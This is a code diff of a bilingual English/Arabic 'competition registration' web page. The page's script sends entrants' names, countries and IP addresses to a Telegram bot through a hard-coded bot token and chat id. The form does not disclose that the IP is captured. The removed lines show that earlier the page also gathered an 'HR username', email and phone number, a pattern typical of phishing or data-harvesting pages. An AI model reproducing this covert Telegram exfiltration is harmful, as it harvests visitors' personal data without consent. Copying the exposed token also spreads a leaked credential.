@@ -69,9 +69,7 @@
     <h2 id="mainTitle"> Competition Registration</h2>
     <p id="mainText">Please enter your information to join the event:</p>
 
-    <input type="text" id="username" placeholder="Your HR username">
-    <input type="text" id="email" placeholder="Email Address">
-    <input type="text" id="phone" placeholder="Phone Number">
+    <input type="text" id="username" placeholder="Your full name">
 
     <select id="country">
       <option value="" disabled selected>🌍 Select Country</option>
@@ -114,11 +112,11 @@
 
   <script>
     document.addEventListener('DOMContentLoaded', () => {
-      const registeredIP = localStorage.getItem('registered_ip');
-      if (registeredIP) {
-        document.getElementById('statusMsg').textContent = '✅ You have already registered!';
+      const registeredUsername = localStorage.getItem('registered_username');
+      if (registeredUsername) {
+        document.getElementById('statusMsg').textContent = '✅ لقد قمت بالتسجيل بلفعل!';
         document.getElementById('statusMsg').style.color = 'lightgreen';
-        document.querySelector('button').disabled = true; // Disable the submit button
+        document.querySelector('button').disabled = true;
       }
     });
 
@@ -134,11 +132,20 @@
     }
 
     async function checkAndSend() {
-      const registeredIP = localStorage.getItem('registered_ip');
-      if (registeredIP) {
-        const status = document.getElementById('statusMsg');
-        status.textContent = '✅ You have already registered!';
+      const username = document.getElementById('username').value.trim();
+      const registeredUsername = localStorage.getItem('registered_username');
+      const status = document.getElementById('statusMsg');
+
+      if (!username || username === "") {
+        status.textContent = 'الرجاء إدخال الاسم.';
+        status.style.color = 'orange';
+        return;
+      }
+
+      if (registeredUsername && registeredUsername === username) {
+        status.textContent = '✅ لقد قمت بالتسجيل بلفعل بنفس الاسم!';
         status.style.color = 'lightgreen';
+        document.querySelector('button').disabled = true;
         return;
       }
       sendToTelegram();
@@ -147,12 +154,10 @@
     async function sendToTelegram() {
       const username = document.getElementById('username').value.trim();
       const country = document.getElementById('country').value.trim();
-      const email = document.getElementById('email').value.trim();
-      const phone = document.getElementById('phone').value.trim();
       const status = document.getElementById('statusMsg');
 
-      if (!username || !country || !email || !phone) {
-        status.textContent = 'Please fill in all required fields!';
+      if (!username || !country) {
+        status.textContent = 'الرجاء ملء جميع الحقول المطلوبة!';
         status.style.color = 'orange';
         return;
       }
@@ -161,7 +166,7 @@
 
       const token = '6456489010:AAHxWt_1iqbOk7yWiU76djvQMMXToLcmEuU';
       const chat_id = 5830998075;
-      const message = `🎯 Competition Entry:\n\n👤 Username: ${username}\n🌍 Country: ${country}\n📧 Email: ${email}\n📞 Phone: ${phone}\n🌐 IP Address: ${ip}`;
+      const message = `🎯 تسجيل في المسابقة:\n\n👤 اسم المستخدم: ${username}\n🌍 الدولة: ${country}\n🌐 عنوان IP: ${ip}`;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
@@ -176,17 +181,17 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          localStorage.setItem('registered_ip', ip);
-          status.textContent = '✅ You have successfully registered!';
+          localStorage.setItem('registered_username', username);
+          status.textContent = '✅ تم تسجيلك بنجاح!';
           status.style.color = 'lightgreen';
           document.querySelector('button').disabled = true;
         } else {
-          status.textContent = `❌ Failed to send. Error: ${data.description}`;
+          status.textContent = `❌ فشل الإرسال. الخطأ: ${data.description}`;
           status.style.color = 'red';
         }
       })
       .catch(error => {
-        status.textContent = `⚠️ An error occurred: ${error.message}`;
+        status.textContent = `⚠️ حدث خطأ: ${error.message}`;
         status.style.color = 'red';
       });
     }
@@ -197,9 +202,7 @@
 
       document.getElementById('mainTitle').textContent = isEnglish ? ' تسجيل في المسابقة' : ' Competition Registration';
       document.getElementById('mainText').textContent = isEnglish ? 'يرجى إدخال معلوماتك للمشاركة:' : 'Please enter your information to join the event:';
-      document.getElementById('username').placeholder = isEnglish ? 'اسم المستخدم HR الخاص بك' : 'Your HR username';
-      document.getElementById('email').placeholder = isEnglish ? 'البريد الإلكتروني' : 'Email Address';
-      document.getElementById('phone').placeholder = isEnglish ? 'رقم الهاتف' : 'Phone Number';
+      document.getElementById('username').placeholder = isEnglish ? 'الاسم الكامل' : 'Your full name';
       document.querySelector("button").textContent = isEnglish ? 'إرسال' : 'Submit';
       document.getElementById('langToggle').textContent = isEnglish ? 'EN' : 'AR';
     }
